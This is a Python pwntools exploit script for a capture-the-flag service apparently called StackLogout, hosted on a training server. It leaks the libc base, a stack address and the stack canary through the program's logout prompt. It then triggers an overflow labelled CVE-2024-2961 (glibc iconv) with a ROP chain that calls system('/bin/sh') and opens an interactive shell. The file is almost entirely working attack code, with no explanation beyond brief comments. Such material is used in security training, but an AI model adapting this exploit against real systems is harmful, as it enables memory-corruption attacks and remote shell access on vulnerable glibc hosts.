from pwn import *
context.terminal = ['tmux','splitw','-h']
context.arch = 'amd64'
GOLD_TEXT = lambda x: f'\x1b[33m{x}\x1b[0m'
EXE = './docker/StackLogout'

def payload(lo: int):
    global sh
    global gadgets
    if lo:
        if lo & 2:
            sh = remote('127.0.0.1', 3073)
            gdb.attach(('127.0.0.1', 4097), 'b *who+387', EXE)
        else:
            sh = remote('127.0.0.1', 2049)
    else:
        sh = remote('training.0rays.club', 10016)
    libc = ELF('/home/Rocket/glibc-all-in-one/libs/2.39-0ubuntu8_amd64/libc.so.6')

    def logout(buf: bytes, confirm: bool, go_on: bool, buf2: bytes=b'') -> bytes:
        sh.sendafter(b'user', buf)
        if confirm:
            sh.sendlineafter(b'confirm', b'y')
        else:
            sh.sendlineafter(b'confirm', b'n')
            if lo & 2:
                pause()
            sh.send(buf2)

        sh.recvuntil(b'you? ')                          # strip ' [y/n]'
        return sh.sendlineafter(b' [y/n]', b'n' if go_on else b'y')[:-6]

    sh.sendlineafter(b'psh', b'logout')
    reply = logout(b'\xe0', True, True)
    libcBase = u64(reply + b'\0\0') - libc.symbols['_IO_2_1_stdin_']
    libc.address = libcBase
    success(GOLD_TEXT(f"Leak libcBase: {libcBase:#x}"))

    reply = logout(b'STACK'.rjust(8), True, True)
    # stack under logout is unstable!
    stack = u64(reply[reply.index(b'STACK') + 5:] + b'\0\0') - 0x60
    success(GOLD_TEXT(f"Leak stack: {stack:#x}"))

    reply = logout(b'CANARY'.rjust(0x19), True, True)
    canary = u64(b'\0' + reply[reply.index(b'CANARY') + 6:][:7])
    success(GOLD_TEXT(f"Leak canary: {canary:#x}"))

    gadgets = ROP(libc)
    logout(b'Trigger CVE-2024-2961!!'.ljust(0x2d) + '劄'.encode(), False, False, 
             # system("bin/sh")
        flat(gadgets.rdi.address, next(libc.search(b'/bin/sh')), libc.symbols['system'],
             # _exit(0)
             gadgets.rdi.address, 0, libc.symbols['_exit'],
             0x48, canary, stack - 8))
    # logout(b'Trigger CVE-2024-2961!!'.ljust(0x24) + '湿湿湿䂚'.encode(), False, False,

    sh.clean()
    sh.interactive()
    sh.close()
